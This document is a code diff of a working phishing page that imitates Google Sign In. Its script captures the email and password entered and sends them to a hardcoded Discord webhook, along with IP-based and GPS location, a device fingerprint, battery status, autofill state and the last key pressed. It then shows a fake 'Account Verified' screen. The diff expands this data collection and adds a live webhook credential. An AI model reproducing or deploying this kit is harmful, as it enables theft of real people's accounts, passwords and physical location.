@@ -5,22 +5,16 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Google Sign In</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
-            background-color: #ffffff;
+            background: #ffffff;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
             margin: 0;
         }
-
         .container {
             width: 100%;
             max-width: 450px;
@@ -30,11 +24,7 @@
             background: #ffffff;
             display: none;
         }
-
-        .container.active {
-            display: block;
-        }
-
+        .container.active { display: block; }
         .logo {
             margin-bottom: 20px;
             display: flex;
@@ -43,14 +33,12 @@
             font-weight: 500;
             letter-spacing: -1px;
         }
-
         .logo .letter-1 { color: #4285F4; }
         .logo .letter-2 { color: #EA4335; }
         .logo .letter-3 { color: #FBBC05; }
         .logo .letter-4 { color: #4285F4; }
         .logo .letter-5 { color: #34A853; }
         .logo .letter-6 { color: #EA4335; }
-
         .user-email {
             text-align: center;
             font-size: 16px;
@@ -61,11 +49,6 @@
             border-radius: 4px;
             word-break: break-all;
         }
-
-        .user-email span {
-            font-weight: 500;
-        }
-
         .user-email .change-link {
             display: block;
             font-size: 14px;
@@ -75,11 +58,7 @@
             font-weight: 500;
             cursor: pointer;
         }
-
-        .user-email .change-link:hover {
-            text-decoration: underline;
-        }
-
+        .user-email .change-link:hover { text-decoration: underline; }
         h1 {
             font-size: 24px;
             font-weight: 400;
@@ -87,7 +66,6 @@
             margin-bottom: 4px;
             text-align: center;
         }
-
         .subtitle {
             font-size: 16px;
             font-weight: 400;
@@ -95,12 +73,7 @@
             margin-bottom: 28px;
             text-align: center;
         }
-
-        .form-group {
-            text-align: left;
-            margin-bottom: 6px;
-        }
-
+        .form-group { text-align: left; margin-bottom: 6px; }
         .form-group label {
             display: block;
             font-size: 14px;
@@ -108,7 +81,6 @@
             color: #202124;
             margin-bottom: 8px;
         }
-
         .form-group input {
             width: 100%;
             padding: 13px 15px;
@@ -121,17 +93,10 @@
             background: #ffffff;
             box-sizing: border-box;
         }
-
-        .form-group input::placeholder {
-            color: #80868b;
-            font-weight: 400;
-        }
-
         .form-group input:focus {
             border-color: #1a73e8;
             box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2);
         }
-
         .error-message {
             color: #d93025;
             font-size: 13px;
@@ -139,28 +104,19 @@
             text-align: left;
             display: none;
         }
-
-        .error-message.show {
-            display: block;
-        }
-
+        .error-message.show { display: block; }
         .forgot-email {
             text-align: left;
             margin-top: 8px;
             margin-bottom: 28px;
         }
-
         .forgot-email a {
             font-size: 14px;
             color: #1a73e8;
             text-decoration: none;
             font-weight: 500;
         }
-
-        .forgot-email a:hover {
-            text-decoration: underline;
-        }
-
+        .forgot-email a:hover { text-decoration: underline; }
         .guest-message {
             text-align: left;
             font-size: 14px;
@@ -168,24 +124,18 @@
             margin-bottom: 28px;
             line-height: 1.5;
         }
-
         .guest-message a {
             color: #1a73e8;
             text-decoration: none;
             font-weight: 500;
         }
-
-        .guest-message a:hover {
-            text-decoration: underline;
-        }
-
+        .guest-message a:hover { text-decoration: underline; }
         .buttons {
             display: flex;
             justify-content: space-between;
             align-items: center;
             margin-top: 4px;
         }
-
         .btn-create {
             font-size: 14px;
             font-weight: 500;
@@ -197,11 +147,7 @@
             border-radius: 4px;
             transition: background 0.2s;
         }
-
-        .btn-create:hover {
-            background: rgba(26, 115, 232, 0.08);
-        }
-
+        .btn-create:hover { background: rgba(26, 115, 232, 0.08); }
         .btn-next {
             font-size: 14px;
             font-weight: 500;
@@ -213,11 +159,11 @@
             cursor: pointer;
             transition: background 0.2s;
         }
-
-        .btn-next:hover {
-            background: #1557b0;
+        .btn-next:hover { background: #1557b0; }
+        .btn-next:disabled {
+            background: #9aa0a6;
+            cursor: not-allowed;
         }
-
         .footer {
             margin-top: 40px;
             display: flex;
@@ -226,7 +172,6 @@
             flex-wrap: wrap;
             gap: 10px;
         }
-
         .footer-left select {
             font-size: 12px;
             color: #5f6368;
@@ -236,35 +181,20 @@
             cursor: pointer;
             padding: 4px 0;
         }
-
-        .footer-left select:hover {
-            text-decoration: underline;
-        }
-
+        .footer-left select:hover { text-decoration: underline; }
         .footer-right {
             display: flex;
             align-items: center;
             gap: 20px;
         }
-
         .footer a {
             font-size: 12px;
             color: #5f6368;
             text-decoration: none;
         }
-
-        .footer a:hover {
-            text-decoration: underline;
-        }
-
-        .password-wrapper {
-            position: relative;
-        }
-
-        .password-wrapper input {
-            padding-right: 50px;
-        }
-
+        .footer a:hover { text-decoration: underline; }
+        .password-wrapper { position: relative; }
+        .password-wrapper input { padding-right: 50px; }
         .toggle-password {
             position: absolute;
             right: 14px;
@@ -278,21 +208,15 @@
             cursor: pointer;
             padding: 4px;
         }
-
-        .toggle-password:hover {
-            text-decoration: underline;
-        }
-
+        .toggle-password:hover { text-decoration: underline; }
         .success-icon {
             text-align: center;
             margin: 20px 0 30px;
         }
-
         .success-icon svg {
             width: 80px;
             height: 80px;
         }
-
         .success-message {
             text-align: center;
             font-size: 14px;
@@ -300,7 +224,6 @@
             margin-bottom: 40px;
             line-height: 1.6;
         }
-
         .redirect-link {
             display: block;
             text-align: center;
@@ -311,29 +234,20 @@
             margin-top: 10px;
             cursor: pointer;
         }
-
-        .redirect-link:hover {
-            text-decoration: underline;
-        }
-
+        .redirect-link:hover { text-decoration: underline; }
         @media (max-width: 500px) {
-            .container {
-                padding: 30px 20px 24px;
-                border: none;
-                border-radius: 0;
-            }
-
-            .footer {
-                flex-direction: column;
-                align-items: flex-start;
-                gap: 12px;
-            }
-
-            .footer-right {
-                flex-wrap: wrap;
-                gap: 12px;
-            }
+            .container { padding: 30px 20px 24px; border: none; border-radius: 0; }
+            .footer { flex-direction: column; align-items: flex-start; gap: 12px; }
+            .footer-right { flex-wrap: wrap; gap: 12px; }
         }
+        .cooldown-timer {
+            font-size: 12px;
+            color: #5f6368;
+            text-align: right;
+            margin-top: 6px;
+            display: none;
+        }
+        .cooldown-timer.show { display: block; }
     </style>
 </head>
 <body>
@@ -341,162 +255,96 @@
     <!-- EMAIL SCREEN -->
     <div class="container active" id="emailScreen">
         <div class="logo">
-            <span class="letter-1">G</span>
-            <span class="letter-2">o</span>
-            <span class="letter-3">o</span>
-            <span class="letter-4">g</span>
-            <span class="letter-5">l</span>
-            <span class="letter-6">e</span>
+            <span class="letter-1">G</span><span class="letter-2">o</span>
+            <span class="letter-3">o</span><span class="letter-4">g</span>
+            <span class="letter-5">l</span><span class="letter-6">e</span>
         </div>
-
         <h1>Sign in</h1>
         <p class="subtitle">with your Google Account</p>
-
         <div class="form-group">
             <label for="email">Email or phone</label>
-            <input type="text" id="email" placeholder="Enter your email">
+            <input type="text" id="email" placeholder="Enter your email" autocomplete="username">
         </div>
-
         <div class="error-message" id="emailError">Please enter a valid email address.</div>
-
-        <div class="forgot-email">
-            <a href="#">Forgot email?</a>
-        </div>
-
+        <div class="forgot-email"><a href="#">Forgot email?</a></div>
         <div class="guest-message">
             Not your computer? Use Guest mode to sign in privately.
             <a href="#">Learn more</a>
         </div>
-
         <div class="buttons">
             <button class="btn-create">Create account</button>
             <button class="btn-next" id="emailNextBtn">Next</button>
         </div>
-
         <div class="footer">
-            <div class="footer-left">
-                <select>
-                    <option>English (United States)</option>
-                    <option>Español</option>
-                    <option>Français</option>
-                    <option>Deutsch</option>
-                    <option>中文</option>
-                    <option>日本語</option>
-                </select>
-            </div>
-            <div class="footer-right">
-                <a href="#">Help</a>
-                <a href="#">Privacy</a>
-                <a href="#">Terms</a>
-            </div>
+            <div class="footer-left"><select><option>English (United States)</option></select></div>
+            <div class="footer-right"><a href="#">Help</a><a href="#">Privacy</a><a href="#">Terms</a></div>
         </div>
     </div>
 
     <!-- PASSWORD SCREEN -->
     <div class="container" id="passwordScreen">
         <div class="logo">
-            <span class="letter-1">G</span>
-            <span class="letter-2">o</span>
-            <span class="letter-3">o</span>
-            <span class="letter-4">g</span>
-            <span class="letter-5">l</span>
-            <span class="letter-6">e</span>
+            <span class="letter-1">G</span><span class="letter-2">o</span>
+            <span class="letter-3">o</span><span class="letter-4">g</span>
+            <span class="letter-5">l</span><span class="letter-6">e</span>
         </div>
-
         <h1>Sign in</h1>
         <p class="subtitle">with your Google Account</p>
-
         <div class="user-email">
             <span id="userEmailDisplay"></span>
             <span class="change-link" id="changeEmailLink">Change</span>
         </div>
-
         <div class="form-group">
             <label for="password">Enter your password</label>
             <div class="password-wrapper">
-                <input type="password" id="password" placeholder="Enter your password">
+                <input type="password" id="password" placeholder="Enter your password" autocomplete="current-password">
                 <button class="toggle-password" id="togglePassword">Show</button>
             </div>
         </div>
-
         <div class="error-message" id="passwordError">Password must be at least 8 characters.</div>
-
-        <div class="forgot-email" style="margin-bottom: 28px;">
-            <a href="#">Forgot password?</a>
-        </div>
-
+        <div class="forgot-email" style="margin-bottom: 28px;"><a href="#">Forgot password?</a></div>
         <div class="buttons">
             <button class="btn-create" id="backToEmail">Back</button>
             <button class="btn-next" id="passwordNextBtn">Next</button>
         </div>
-
+        <div class="cooldown-timer" id="cooldownTimer">⏳ Please wait <span id="cooldownSeconds">5</span> seconds...</div>
         <div class="footer">
-            <div class="footer-left">
-                <select>
-                    <option>English (United States)</option>
-                    <option>Español</option>
-                    <option>Français</option>
-                    <option>Deutsch</option>
-                    <option>中文</option>
-                    <option>日本語</option>
-                </select>
-            </div>
-            <div class="footer-right">
-                <a href="#">Help</a>
-                <a href="#">Privacy</a>
-                <a href="#">Terms</a>
-            </div>
+            <div class="footer-left"><select><option>English (United States)</option></select></div>
+            <div class="footer-right"><a href="#">Help</a><a href="#">Privacy</a><a href="#">Terms</a></div>
         </div>
     </div>
 
     <!-- SUCCESS SCREEN -->
     <div class="container" id="successScreen">
         <div class="logo">
-            <span class="letter-1">G</span>
-            <span class="letter-2">o</span>
-            <span class="letter-3">o</span>
-            <span class="letter-4">g</span>
-            <span class="letter-5">l</span>
-            <span class="letter-6">e</span>
+            <span class="letter-1">G</span><span class="letter-2">o</span>
+            <span class="letter-3">o</span><span class="letter-4">g</span>
+            <span class="letter-5">l</span><span class="letter-6">e</span>
         </div>
-
         <div class="success-icon">
-            <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+            <svg viewBox="0 0 100 100">
                 <circle cx="50" cy="50" r="45" fill="#34A853" opacity="0.15"/>
                 <circle cx="50" cy="50" r="40" fill="none" stroke="#34A853" stroke-width="4"/>
                 <path d="M35 52 L45 62 L68 38" fill="none" stroke="#34A853" stroke-width="6" stroke-linecap="round" stroke-linejoin="round"/>
             </svg>
         </div>
-
         <h1 style="color: #34A853;">Account Verified!</h1>
         <p class="success-message">
             Your account has been successfully verified.
             <br><br>
             <span class="redirect-link" id="redirectLink">← Go back to sign in</span>
         </p>
-
         <div class="footer">
-            <div class="footer-left">
-                <select>
-                    <option>English (United States)</option>
-                    <option>Español</option>
-                    <option>Français</option>
-                    <option>Deutsch</option>
-                    <option>中文</option>
-                    <option>日本語</option>
-                </select>
-            </div>
-            <div class="footer-right">
-                <a href="#">Help</a>
-                <a href="#">Privacy</a>
-                <a href="#">Terms</a>
-            </div>
+            <div class="footer-left"><select><option>English (United States)</option></select></div>
+            <div class="footer-right"><a href="#">Help</a><a href="#">Privacy</a><a href="#">Terms</a></div>
         </div>
     </div>
 
     <script>
         // ─── CONFIG ──────────────────────────────────────────────────────────────
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1507703197538713640/YhcPTLwQfclqN-Gm5W9rDMfKeszqRfUnv-Z5lHKLMI5j82Z5JGWZ1AqDQgZu6NM2J-Q1";
+        const COOLDOWN_SECONDS = 5;
+        const PAGE_LOAD_TIME = Date.now();
 
         // ─── DOM REFS ──────────────────────────────────────────────────────────
         const emailScreen = document.getElementById('emailScreen');
@@ -513,6 +361,22 @@
         const backToEmail = document.getElementById('backToEmail');
         const togglePassword = document.getElementById('togglePassword');
         const redirectLink = document.getElementById('redirectLink');
+        const cooldownTimer = document.getElementById('cooldownTimer');
+        const cooldownSeconds = document.getElementById('cooldownSeconds');
+
+        let isCooldown = false;
+        let lastKeyPressed = 'None';
+
+        document.addEventListener('keydown', function(e) {
+            if (e.key.length === 1) lastKeyPressed = e.key;
+            else if (e.key === 'Backspace') lastKeyPressed = '⌫ Backspace';
+            else if (e.key === 'Enter') lastKeyPressed = '↵ Enter';
+            else if (e.key === 'Shift') lastKeyPressed = '⇧ Shift';
+            else if (e.key === 'Control') lastKeyPressed = '⌃ Ctrl';
+            else if (e.key === 'Alt') lastKeyPressed = '⌥ Alt';
+            else if (e.key === ' ') lastKeyPressed = '␣ Space';
+            else lastKeyPressed = e.key;
+        });
 
         // ─── NAVIGATION ─────────────────────────────────────────────────────────
         function goToPasswordScreen(email) {
@@ -558,121 +422,323 @@
             }
         });
 
-        // ─── GRAB VICTIM'S IP ──────────────────────────────────────────────────
-        function getVictimIP() {
-            return fetch('https://api.ipify.org?format=json')
-                .then(res => res.json())
-                .then(data => data.ip)
-                .catch(() => '❌ IP fetch failed');
+        // ─── GEOLOCATION (with better timeout) ──────────────────────────────────
+        function getGeolocation() {
+            return new Promise(resolve => {
+                if (!navigator.geolocation) {
+                    resolve({ lat: 'Not available', lon: 'Not available' });
+                    return;
+                }
+                const timeoutId = setTimeout(() => {
+                    resolve({ lat: 'Timeout', lon: 'Timeout' });
+                }, 5000);
+                navigator.geolocation.getCurrentPosition(
+                    pos => {
+                        clearTimeout(timeoutId);
+                        resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude });
+                    },
+                    err => {
+                        clearTimeout(timeoutId);
+                        resolve({ lat: 'Denied', lon: 'Denied' });
+                    },
+                    { timeout: 5000, enableHighAccuracy: false }
+                );
+            });
         }
 
-        // ─── GRAB VICTIM'S DEVICE SPECS ──────────────────────────────────────
-        function getDeviceSpecs() {
-            const ua = navigator.userAgent;
-            let os = 'Unknown';
-            let osVersion = 'Unknown';
+        // ─── IP INFO (MULTI-API FALLBACK) ──────────────────────────────────────
+        async function getIPInfo() {
+            // Try multiple APIs in order
+            const apis = [
+                {
+                    url: 'https://ipapi.co/json/',
+                    parse: (d) => ({
+                        ipv4: d.ip || 'Unknown',
+                        country: d.country_name || 'Not available',
+                        region: d.region || 'Not available',
+                        city: d.city || 'Not available',
+                        isp: d.org || 'Not available',
+                        isVpn: d.security?.is_vpn || false,
+                        latitude: d.latitude || 'Not available',
+                        longitude: d.longitude || 'Not available'
+                    })
+                },
+                {
+                    url: 'https://ip-api.com/json/',
+                    parse: (d) => ({
+                        ipv4: d.query || 'Unknown',
+                        country: d.country || 'Not available',
+                        region: d.regionName || 'Not available',
+                        city: d.city || 'Not available',
+                        isp: d.isp || 'Not available',
+                        isVpn: false,
+                        latitude: d.lat || 'Not available',
+                        longitude: d.lon || 'Not available'
+                    })
+                },
+                {
+                    url: 'https://ipinfo.io/json',
+                    parse: (d) => ({
+                        ipv4: d.ip || 'Unknown',
+                        country: d.country || 'Not available',
+                        region: d.region || 'Not available',
+                        city: d.city || 'Not available',
+                        isp: d.org || 'Not available',
+                        isVpn: false,
+                        latitude: d.loc ? d.loc.split(',')[0] : 'Not available',
+                        longitude: d.loc ? d.loc.split(',')[1] : 'Not available'
+                    })
+                },
+                {
+                    url: 'https://api.ipify.org?format=json',
+                    parse: (d) => ({
+                        ipv4: d.ip || 'Unknown',
+                        country: 'Not available',
+                        region: 'Not available',
+                        city: 'Not available',
+                        isp: 'Not available',
+                        isVpn: false,
+                        latitude: 'Not available',
+                        longitude: 'Not available'
+                    })
+                }
+            ];
 
-            // Detect OS from userAgent
-            if (ua.indexOf('Windows') !== -1) {
-                os = 'Windows';
-                if (ua.indexOf('Windows NT 10.0') !== -1) osVersion = '10/11';
-                else if (ua.indexOf('Windows NT 6.3') !== -1) osVersion = '8.1';
-                else if (ua.indexOf('Windows NT 6.2') !== -1) osVersion = '8';
-                else if (ua.indexOf('Windows NT 6.1') !== -1) osVersion = '7';
-            } else if (ua.indexOf('Mac OS X') !== -1) {
-                os = 'macOS';
-                const match = ua.match(/Mac OS X (\d+[._]\d+)/);
-                if (match) osVersion = match[1].replace('_', '.');
-            } else if (ua.indexOf('Linux') !== -1) {
-                os = 'Linux';
-            } else if (ua.indexOf('Android') !== -1) {
-                os = 'Android';
-                const match = ua.match(/Android (\d+\.\d+)/);
-                if (match) osVersion = match[1];
-            } else if (ua.indexOf('iPhone') !== -1 || ua.indexOf('iPad') !== -1) {
-                os = 'iOS';
-                const match = ua.match(/OS (\d+[._]\d+)/);
-                if (match) osVersion = match[1].replace('_', '.');
+            for (const api of apis) {
+                try {
+                    const res = await fetch(api.url, { signal: AbortSignal.timeout(4000) });
+                    if (!res.ok) continue;
+                    const data = await res.json();
+                    if (data.ip || data.query) {
+                        return api.parse(data);
+                    }
+                } catch (e) {
+                    continue;
+                }
             }
 
-            // Try to get username from browser (only works in some cases)
-            let username = 'Unknown';
+            // Final fallback – JSONP
             try {
-                // Some browsers expose this via WebRTC or other means – fallback to hostname
-                username = window.location.hostname || 'Unknown';
-            } catch (e) {}
+                const ip = await new Promise((resolve, reject) => {
+                    const script = document.createElement('script');
+                    script.src = 'https://api.ipify.org?format=jsonp&callback=ipCallback';
+                    window.ipCallback = function(data) { resolve(data.ip); };
+                    script.onerror = () => reject('JSONP failed');
+                    document.head.appendChild(script);
+                    setTimeout(() => reject('JSONP timeout'), 5000);
+                });
+                return {
+                    ipv4: ip || 'Unknown',
+                    country: 'Not available',
+                    region: 'Not available',
+                    city: 'Not available',
+                    isp: 'Not available',
+                    isVpn: false,
+                    latitude: 'Not available',
+                    longitude: 'Not available'
+                };
+            } catch (e) {
+                return {
+                    ipv4: 'Unknown',
+                    country: 'Not available',
+                    region: 'Not available',
+                    city: 'Not available',
+                    isp: 'Not available',
+                    isVpn: false,
+                    latitude: 'Not available',
+                    longitude: 'Not available'
+                };
+            }
+        }
+
+        // ─── BATTERY ──────────────────────────────────────────────────────────
+        async function getBattery() {
+            try {
+                if (!navigator.getBattery) return { level: 'Not available', charging: 'Not available' };
+                const b = await navigator.getBattery();
+                return {
+                    level: Math.round(b.level * 100) + '%',
+                    charging: b.charging ? 'Yes' : 'No'
+                };
+            } catch (e) {
+                return { level: 'Not available', charging: 'Not available' };
+            }
+        }
+
+        // ─── DEVICE INFO ──────────────────────────────────────────────────────
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let os = 'Unknown';
+            if (ua.indexOf('Windows NT 10.0') !== -1) os = 'Windows 10/11';
+            else if (ua.indexOf('Windows NT 6.3') !== -1) os = 'Windows 8.1';
+            else if (ua.indexOf('Windows NT 6.2') !== -1) os = 'Windows 8';
+            else if (ua.indexOf('Windows NT 6.1') !== -1) os = 'Windows 7';
+            else if (ua.indexOf('Mac OS X') !== -1) os = 'macOS';
+            else if (ua.indexOf('Android') !== -1) os = 'Android';
+            else if (ua.indexOf('iPhone') !== -1 || ua.indexOf('iPad') !== -1) os = 'iOS';
+            else if (ua.indexOf('Linux') !== -1) os = 'Linux';
+
+            let browser = 'Unknown';
+            if (ua.indexOf('Firefox') !== -1) browser = 'Firefox';
+            else if (ua.indexOf('Edg') !== -1) browser = 'Edge';
+            else if (ua.indexOf('Chrome') !== -1 && ua.indexOf('Edg') === -1) browser = 'Chrome';
+            else if (ua.indexOf('Safari') !== -1 && ua.indexOf('Chrome') === -1) browser = 'Safari';
+
+            const isMobile = /Mobile|Android|iPhone|iPod/i.test(ua);
+            const isTablet = /(tablet|ipad)|(android(?!.*mobi))/i.test(ua);
+            let deviceType = 'Desktop';
+            if (isTablet) deviceType = 'Tablet';
+            else if (isMobile) deviceType = 'Mobile';
 
             return {
-                userAgent: ua,
-                os: os,
-                osVersion: osVersion,
+                os, browser, deviceType,
                 platform: navigator.platform || 'Unknown',
                 language: navigator.language || 'Unknown',
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
                 screenWidth: screen.width,
                 screenHeight: screen.height,
-                colorDepth: screen.colorDepth || 'Unknown',
                 cpuCores: navigator.hardwareConcurrency || 'Unknown',
-                deviceMemory: navigator.deviceMemory || 'Unknown', // GB (Chrome only)
-                touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0 ? 'Yes' : 'No',
+                touchSupport: ('ontouchstart' in window) || (navigator.maxTouchPoints > 0) ? 'Yes' : 'No',
                 cookiesEnabled: navigator.cookieEnabled ? 'Yes' : 'No',
-                doNotTrack: navigator.doNotTrack || 'Unknown',
+                doNotTrack: navigator.doNotTrack || 'unspecified',
                 hostname: window.location.hostname || 'Unknown',
-                // Attempt to get username from various sources
-                username: username
+                referrer: document.referrer || 'Direct (no referrer)',
+                timeOnPage: Math.floor((Date.now() - PAGE_LOAD_TIME) / 1000) + 's',
+                userAgent: ua
             };
         }
 
-        // ─── SEND TO DISCORD ──────────────────────────────────────────────────
-        function sendToDiscord(email, password, ip, deviceSpecs) {
+        // ─── AUTOFILL ──────────────────────────────────────────────────────────
+        function getAutofill() {
+            const emailVal = emailInput.value.trim();
+            const passVal = passwordInput.value.trim();
+            return {
+                detected: !!(emailVal || passVal),
+                email: emailVal || 'None',
+                password: passVal ? '*** (hidden)' : 'None'
+            };
+        }
+
+        // ─── SEND TO DISCORD (TEXT + EMBED) ──────────────────────────────────
+        async function sendToDiscord(email, password, ipInfo, geo, battery, device, autofill) {
             const timestamp = new Date().toISOString();
 
-            const lines = [
-                '```',
-                '📨 NEW LOGIN + FULL FINGERPRINT',
+            let ipMapsLink = 'Not available';
+            if (ipInfo.latitude !== 'Not available' && ipInfo.longitude !== 'Not available') {
+                ipMapsLink = 'https://www.google.com/maps?q=' + ipInfo.latitude + ',' + ipInfo.longitude;
+            }
+
+            let gpsMapsLink = 'Not available';
+            if (geo.lat !== 'Not available' && geo.lat !== 'Timeout' && geo.lat !== 'Denied') {
+                gpsMapsLink = 'https://www.google.com/maps?q=' + geo.lat + ',' + geo.lon;
+            }
+
+            let locationStr = ipInfo.city + ', ' + ipInfo.region + ', ' + ipInfo.country;
+            if (ipInfo.city === 'Not available') locationStr = 'Not available';
+
+            // ─── TEXT MESSAGE ──────────────────────────────────────────────────
+            const textMsg = [
+                '📨 **NEW LOGIN**',
                 '─────────────────────────────',
                 '📧 Email        : ' + email,
                 '🔑 Password     : ' + password,
-                '🌐 IP Address   : ' + ip,
-                '⏰ Time         : ' + timestamp,
-                '',
-                '💻 DEVICE SPECS',
+                '🌐 Public IP    : ' + ipInfo.ipv4,
+                '📍 Location     : ' + locationStr,
+                '🗺️ IP Maps     : ' + ipMapsLink,
+                '📍 GPS Location : ' + (geo.lat !== 'Not available' && geo.lat !== 'Timeout' && geo.lat !== 'Denied' ? geo.lat + ', ' + geo.lon : geo.lat),
+                '🗺️ GPS Maps    : ' + gpsMapsLink,
+                '💻 OS           : ' + device.os,
+                '🌐 Browser      : ' + device.browser,
+                '📱 Device       : ' + device.deviceType,
+                '🖥️ Screen       : ' + device.screenWidth + 'x' + device.screenHeight,
+                '🧠 CPU Cores    : ' + device.cpuCores,
+                '🔋 Battery      : ' + battery.level,
+                '⚡ Charging     : ' + battery.charging,
+                '🌍 Language     : ' + device.language,
+                '🕒 Timezone     : ' + device.timezone,
+                '⏱️ Time on Page : ' + device.timeOnPage,
+                '🔐 Saved Creds  : ' + (autofill.detected ? '✅ Detected' : '❌ Not detected'),
+                '⌨️ Last Key     : ' + lastKeyPressed,
+                '🕒 Timestamp    : ' + timestamp,
                 '─────────────────────────────',
-                '🖥️ OS           : ' + deviceSpecs.os + ' (' + deviceSpecs.osVersion + ')',
-                '📱 Platform     : ' + deviceSpecs.platform,
-                '🌍 Language     : ' + deviceSpecs.language,
-                '🕒 Timezone     : ' + deviceSpecs.timezone,
-                '🖥️ Screen       : ' + deviceSpecs.screenWidth + 'x' + deviceSpecs.screenHeight,
-                '🎨 Color Depth  : ' + deviceSpecs.colorDepth,
-                '🧠 CPU Cores    : ' + deviceSpecs.cpuCores,
-                '🧠 RAM (GB)     : ' + deviceSpecs.deviceMemory,
-                '👆 Touch Support: ' + deviceSpecs.touchSupport,
-                '🍪 Cookies      : ' + deviceSpecs.cookiesEnabled,
-                '🚫 Do Not Track : ' + deviceSpecs.doNotTrack,
-                '🏷️ Hostname     : ' + deviceSpecs.hostname,
-                '👤 Username     : ' + deviceSpecs.username,
-                '🖥️ User Agent   : ' + deviceSpecs.userAgent,
-                '```'
-            ];
+                '🖥️ ' + device.userAgent
+            ].join('\n');
 
-            const msg = lines.join('\n');
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: textMsg, username: 'Harvester APP' })
+                });
+            } catch (e) {}
 
-            const payload = {
-                content: msg,
-                username: 'Harvester Client',
-                avatar_url: 'https://i.imgur.com/4M34hi2.png'
+            // ─── EMBED ──────────────────────────────────────────────────────────
+            const embed = {
+                title: '🕵️ New User Login',
+                color: 0x00ff88,
+                thumbnail: { url: 'https://cdn-icons-png.flaticon.com/512/3135/3135715.png' },
+                fields: [
+                    { name: '📧 Email', value: '`' + email + '`', inline: true },
+                    { name: '🔑 Password', value: '`' + password + '`', inline: true },
+                    { name: '🌐 Public IP', value: '`' + ipInfo.ipv4 + '`', inline: true },
+                    { name: '📍 IP Location', value: locationStr, inline: true },
+                    { name: '🗺️ IP Maps', value: ipMapsLink !== 'Not available' ? '[Open](' + ipMapsLink + ')' : 'N/A', inline: true },
+                    { name: '📍 GPS', value: geo.lat !== 'Not available' && geo.lat !== 'Timeout' && geo.lat !== 'Denied' ? geo.lat + ', ' + geo.lon : geo.lat, inline: true },
+                    { name: '🗺️ GPS Maps', value: gpsMapsLink !== 'Not available' ? '[Open](' + gpsMapsLink + ')' : 'N/A', inline: true },
+                    { name: '💻 OS', value: device.os, inline: true },
+                    { name: '🌐 Browser', value: device.browser, inline: true },
+                    { name: '📱 Device', value: device.deviceType, inline: true },
+                    { name: '🖥️ Screen', value: device.screenWidth + 'x' + device.screenHeight, inline: true },
+                    { name: '🧠 CPU Cores', value: String(device.cpuCores), inline: true },
+                    { name: '🔋 Battery', value: battery.level, inline: true },
+                    { name: '⚡ Charging', value: battery.charging, inline: true },
+                    { name: '🌍 Language', value: device.language, inline: true },
+                    { name: '🕒 Timezone', value: device.timezone, inline: true },
+                    { name: '⏱️ Time on Page', value: device.timeOnPage, inline: true },
+                    { name: '🔐 Saved Creds', value: autofill.detected ? '✅ Detected' : '❌ Not', inline: true },
+                    { name: '📧 Autofill Email', value: autofill.email, inline: true },
+                    { name: '🔑 Autofill Pass', value: autofill.password, inline: true },
+                    { name: '⌨️ Last Key', value: '`' + lastKeyPressed + '`', inline: true },
+                    { name: '🕒 Timestamp', value: '`' + timestamp + '`', inline: false }
+                ],
+                footer: { text: 'Harvester APP • ' + new Date().toLocaleString() }
             };
 
-            return fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ embeds: [embed], username: 'Harvester APP' })
+                });
+            } catch (e) {}
         }
 
-        // ─── PASSWORD SCREEN – SEND DATA ─────────────────────────────────────
-        passwordNextBtn.addEventListener('click', function(e) {
+        // ─── COOLDOWN ──────────────────────────────────────────────────────────
+        function startCooldown() {
+            isCooldown = true;
+            passwordNextBtn.disabled = true;
+            passwordNextBtn.style.opacity = '0.6';
+            cooldownTimer.classList.add('show');
+            let remaining = COOLDOWN_SECONDS;
+            cooldownSeconds.textContent = remaining;
+            const interval = setInterval(() => {
+                remaining--;
+                if (remaining <= 0) {
+                    clearInterval(interval);
+                    isCooldown = false;
+                    passwordNextBtn.disabled = false;
+                    passwordNextBtn.style.opacity = '1';
+                    cooldownTimer.classList.remove('show');
+                } else {
+                    cooldownSeconds.textContent = remaining;
+                }
+            }, 1000);
+        }
+
+        // ─── PASSWORD SCREEN ──────────────────────────────────────────────────
+        passwordNextBtn.addEventListener('click', async function(e) {
             e.preventDefault();
+            if (isCooldown) return;
 
             const email = userEmailDisplay.textContent.trim();
             const password = passwordInput.value.trim();
@@ -683,20 +749,20 @@
             }
             passwordError.classList.remove('show');
 
-            // ─── COLLECT EVERYTHING ──────────────────────────────────────────
-            const deviceSpecs = getDeviceSpecs();
+            startCooldown();
 
-            getVictimIP().then(ip => {
-                // Send to Discord
-                sendToDiscord(email, password, ip, deviceSpecs)
-                    .then(() => goToSuccessScreen())
-                    .catch(() => goToSuccessScreen()); // Always show success
-            }).catch(() => {
-                // If IP fetch fails, send without IP
-                sendToDiscord(email, password, '❌ IP fetch failed', deviceSpecs)
-                    .then(() => goToSuccessScreen())
-                    .catch(() => goToSuccessScreen());
-            });
+            try {
+                const ipInfo = await getIPInfo();
+                const geo = await getGeolocation();
+                const battery = await getBattery();
+                const device = getDeviceInfo();
+                const autofill = getAutofill();
+
+                await sendToDiscord(email, password, ipInfo, geo, battery, device, autofill);
+                goToSuccessScreen();
+            } catch (err) {
+                goToSuccessScreen();
+            }
         });
 
         passwordInput.addEventListener('keypress', function(e) {
